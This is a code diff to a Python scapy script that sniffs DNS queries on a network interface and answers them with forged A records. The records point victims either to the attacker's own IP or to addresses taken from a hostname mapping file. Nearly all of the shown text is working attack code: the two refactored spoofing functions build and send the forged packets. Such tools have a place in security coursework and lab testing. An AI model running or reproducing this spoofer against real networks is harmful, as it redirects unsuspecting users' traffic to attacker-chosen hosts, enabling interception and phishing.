@@ -1,10 +1,13 @@
 # library imports
-from scapy.all import Ether, IP, UDP, DNS, DNSRR, sniff, sendp
+from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sniff, sendp
 
 # system imports
 import argparse
 import os
 import socket
+
+# local imports
+from util import get_local_ip
 
 parser = argparse.ArgumentParser(
     description = "[Info] Captures network traffic and attempts to inject forged \
@@ -13,7 +16,7 @@ parser = argparse.ArgumentParser(
 
 poison_ips = {} # dictionary of poison_ips mapped to hostnames to spoof
 
-poison_ip = ""
+poison_ip = get_local_ip()
 interface = "eth0" # default interface
 
 def main():
@@ -29,18 +32,15 @@ def setup_args():
     parser.add_argument('expression', help='a BPF filter that specifies a subset of the traffic to be monitored', nargs='?')
 
 def run(args):
-    print_run_msg(args)
-    
-    update_poison_ips(args)
-
-    global poison_ip
-    poison_ip = get_local_ip()
-
     global interface
     interface = args.i if args.i else interface
 
-    bpf_filter = str.lower(args.expression) if args.expression else None
+    bpf_filter = str.lower(args.expression) if args.expression else "udp dst port 53"
+    args.expression = bpf_filter
 
+    update_poison_ips(args)
+
+    print_run_msg(args)
     sniff(iface = interface, filter=bpf_filter, prn=dns_poisonf if poison_ips else dns_poison, store=0)
 
 def update_poison_ips(args):
@@ -57,63 +57,41 @@ def update_poison_ips(args):
                 poison_ips[line[1]] = line[0]
 
 def dns_poison(pkt):
-    if not pkt.haslayer(DNS) or not pkt.haslayer(UDP) or not pkt.haslayer(IP) or not pkt.haslayer(Ether): return
-    if pkt[DNS].qr != 0 or pkt[DNS].qd.qtype == "AAAA": return
+    # return if the packet does not have a DNS layer
+    if not pkt.haslayer(DNSQR): return
+    qd = pkt[DNS].qd
 
-    # generate new checksums to indicate packet was not modified
-    del pkt[IP].len
-    del pkt[IP].chksum
-    del pkt[UDP].len
-    del pkt[UDP].chksum
-    
-    # switch Ether 
-    pkt[Ether].src, pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src
+    # return if not a dns query or does not have a qtype of "A" 
+    if pkt[DNS].qr != 0 or qd.qtype != 1: return 
 
-    # switch IP
-    pkt[IP].src, pkt[IP].dst = pkt[IP].dst, pkt[IP].src
+    # dns answer with spoofed ip
+    dns_an = DNSRR(rrname=qd.qname, type="A", ttl=30, rdata=poison_ip)
 
-    # switch UDP
-    pkt[UDP].sport, pkt[UDP].dport = pkt[UDP].dport, pkt[UDP].sport
-
-    # edit DNS -> spoofed response
-    pkt[DNS].qr = 1
-    pkt[DNS].aa = 1
-    pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, type="A", rdata=poison_ip)
-    pkt[DNS].ancount = 1
-
-    sendp(pkt, iface=interface, verbose=0)
+    sendp(Ether() / # empty Ether packet makes it work (idk why?)
+        IP(src=pkt[IP].dst, dst=pkt[IP].src) / # switch IP src and dst
+        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / # switch udp sport and dport
+        DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, ra=0, an=dns_an, ancount=1, qd=qd), # spoofed dns packet
+    iface=interface, verbose=0)
 
 def dns_poisonf(pkt):
-    if not pkt.haslayer(DNS) or not pkt.haslayer(UDP) or not pkt.haslayer(IP) or not pkt.haslayer(Ether): return
-    if pkt[DNS].qr != 0 or pkt[DNS].qd.qtype != 1: return
+    # return if the packet does not have a DNS layer
+    if not pkt.haslayer(DNSQR): return
+    qd = pkt[DNS].qd    
+    
+    # return if not a dns query or does not have a qtype of "A" 
+    if pkt[DNS].qr != 0 or qd.qtype != 1: return 
 
-    qname = pkt[DNS].qd.qname # get the domain name queried
-    domain = qname[:-1].decode('utf-8') # remove the extra '.' at the end
-
+    domain = qd.qname[:-1].decode('utf-8') # get the domain name from the query
     if domain not in poison_ips: return
 
-    # generate new checksums to indicate packet was not modified
-    del pkt[IP].len
-    del pkt[IP].chksum
-    del pkt[UDP].len
-    del pkt[UDP].chksum
-    
-    # switch Ether 
-    pkt[Ether].src, pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src
+    # dns answer with spoofed ip
+    dns_an = DNSRR(rrname=qd.qname, type="A", ttl=5, rdata=poison_ips[domain])
 
-    # switch IP
-    pkt[IP].src, pkt[IP].dst = pkt[IP].dst, pkt[IP].src
-
-    # switch UDP
-    pkt[UDP].sport, pkt[UDP].dport = pkt[UDP].dport, pkt[UDP].sport
-
-    # edit DNS -> spoofed response
-    pkt[DNS].qr = 1
-    pkt[DNS].aa = 1
-    pkt[DNS].an = DNSRR(rrname=qname, type="A", ttl=30, rdata=poison_ips[domain])
-    pkt[DNS].ancount = 1
-
-    sendp(pkt, iface=interface, verbose=0)
+    sendp(Ether() / # empty Ether packet makes it work (idk why?)
+        IP(src=pkt[IP].dst, dst=pkt[IP].src) / # switch IP src and dst
+        UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / # switch udp sport and dport
+        DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, ra=0, an=dns_an, ancount=1, qd=qd), # spoofed dns packet
+    iface=interface, verbose=0)
 
 def print_run_msg(args):
     """ Print an appropriate run message based on the flags specified. """
@@ -136,19 +114,6 @@ def print_run_msg(args):
     run_msg = run_msg + " (" + ", ".join(options) + ")"
 
     print(run_msg)
-
-def get_local_ip():
-    local_ip = ""
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(("8.8.8.8", 80))
-        local_ip = s.getsockname()[0]
-        s.close()
-    except:
-        local_ip = "0.0.0.0"
-    
-    return local_ip
     
 if __name__ == '__main__':
     main()
